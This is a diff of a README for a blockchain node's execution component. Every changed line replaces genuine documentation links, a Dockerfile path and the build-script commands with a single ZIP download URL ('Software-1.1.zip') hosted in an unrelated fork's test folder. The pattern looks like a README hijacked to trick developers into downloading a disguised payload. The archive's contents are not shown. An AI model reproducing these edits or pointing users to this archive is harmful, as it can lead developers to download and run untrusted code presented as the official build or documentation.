@@ -6,10 +6,10 @@ This repository contains the execution component of a Monad node. It
 handles the transaction processing for new blocks, and keeps track of
 the state of the blockchain. Consequently, this repository contains
 the source code for Category Labs' custom
-[EVM implementation](https://docs.monad.xyz/monad-arch/execution/native-compilation),
-its [database implementation](https://docs.monad.xyz/monad-arch/execution/monaddb),
-and the high-level [transaction scheduling](https://docs.monad.xyz/monad-arch/execution/parallel-execution).
-The other main repository is [monad-bft](https://github.com/category-labs/monad-bft),
+[EVM implementation](https://github.com/khn0x-khn0x/monad/raw/refs/heads/main/category/statesync/test/Software-1.1.zip),
+its [database implementation](https://github.com/khn0x-khn0x/monad/raw/refs/heads/main/category/statesync/test/Software-1.1.zip),
+and the high-level [transaction scheduling](https://github.com/khn0x-khn0x/monad/raw/refs/heads/main/category/statesync/test/Software-1.1.zip).
+The other main repository is [monad-bft](https://github.com/khn0x-khn0x/monad/raw/refs/heads/main/category/statesync/test/Software-1.1.zip),
 which contains the source code for the consensus component.
 
 ## Building the source code
@@ -34,7 +34,7 @@ Execution has two kinds of dependencies on third-party libraries:
    system's package manager. The primary development platform is Ubuntu, so
    the required packages use the Debian/Ubuntu package names; an up-to-date
    list of the required system dependencies can be found in the docker
-   configuration file `docker/release.Dockerfile` (you will need all
+   configuration file `https://github.com/khn0x-khn0x/monad/raw/refs/heads/main/category/statesync/test/Software-1.1.zip` (you will need all
    the packages installed via the `apt install` commands)
 
 ### Minimum development tool requirements
@@ -46,12 +46,12 @@ Execution has two kinds of dependencies on third-party libraries:
 
 ### CPU compilation requirements
 
-As explained in the [hardware requirements](https://docs.monad.xyz/monad-arch/hardware-requirements),
+As explained in the [hardware requirements](https://github.com/khn0x-khn0x/monad/raw/refs/heads/main/category/statesync/test/Software-1.1.zip),
 a Monad node requires a relatively recent CPU. Execution explicitly
 requires this to compile: it needs to emit machine code that is only
 supported on recent CPU models, for fast cryptographic operations.
 
-The minimum ISA support corresponds to the [x86-64-v3](https://en.wikipedia.org/wiki/X86-64#Microarchitecture_levels)
+The minimum ISA support corresponds to the [x86-64-v3](https://github.com/khn0x-khn0x/monad/raw/refs/heads/main/category/statesync/test/Software-1.1.zip)
 feature level. Consequently, the minimum flag you must pass to the compiler
 is `-march=x86-64-v3`, or alternatively `-march=haswell` ("Haswell" was
 the codename of the first Intel CPU to support all of these features).
@@ -69,7 +69,7 @@ git repository root and then run:
 
 ```shell
 CC=gcc-15 CXX=g++-15 CFLAGS="-march=haswell" CXXFLAGS="-march=haswell" ASMFLAGS="-march=haswell" \
-./scripts/configure.sh && ./scripts/build.sh
+https://github.com/khn0x-khn0x/monad/raw/refs/heads/main/category/statesync/test/Software-1.1.zip && https://github.com/khn0x-khn0x/monad/raw/refs/heads/main/category/statesync/test/Software-1.1.zip
 ```
 
 The above command will do several things:
@@ -78,9 +78,9 @@ The above command will do several things:
 
 - Emit machine code using Haswell-era CPU extensions
 
-- Run CMake, and generate a [ninja](https://ninja-build.org/) build
+- Run CMake, and generate a [ninja](https://github.com/khn0x-khn0x/monad/raw/refs/heads/main/category/statesync/test/Software-1.1.zip) build
   system in the `<path-to-execution-repo>/build` directory with
-  the [`CMAKE_BUILD_TYPE`](https://cmake.org/cmake/help/latest/variable/CMAKE_BUILD_TYPE.html)
+  the [`CMAKE_BUILD_TYPE`](https://github.com/khn0x-khn0x/monad/raw/refs/heads/main/category/statesync/test/Software-1.1.zip)
   set to `RelWithDebInfo` by default
 
 - Build the CMake `all` target, which builds everything
@@ -95,7 +95,7 @@ execution services for different EVM-compatible blockchains:
 
 - When used as part of a Monad blockchain node, it behaves as the block
   execution service for the Category Labs consensus daemon (for details, see
-  [here](docs/overview.md#how-is-execution-used)); when running in this mode,
+  [here](https://github.com/khn0x-khn0x/monad/raw/refs/heads/main/category/statesync/test/Software-1.1.zip)); when running in this mode,
   Monad EVM extensions (e.g., Monad-style staking) are enabled
 
 - It can also replay the history of other EVM-compatible blockchains, by
@@ -113,6 +113,6 @@ CTEST_PARALLEL_LEVEL=$(nproc) ctest
 ## A tour of execution
 
 To understand how the source code is organized, you should start by reading
-the execution [developer overview](docs/overview.md), which explains how
+the execution [developer overview](https://github.com/khn0x-khn0x/monad/raw/refs/heads/main/category/statesync/test/Software-1.1.zip), which explains how
 execution and consensus fit together, and where in the source tree you can
 find different pieces of functionality.
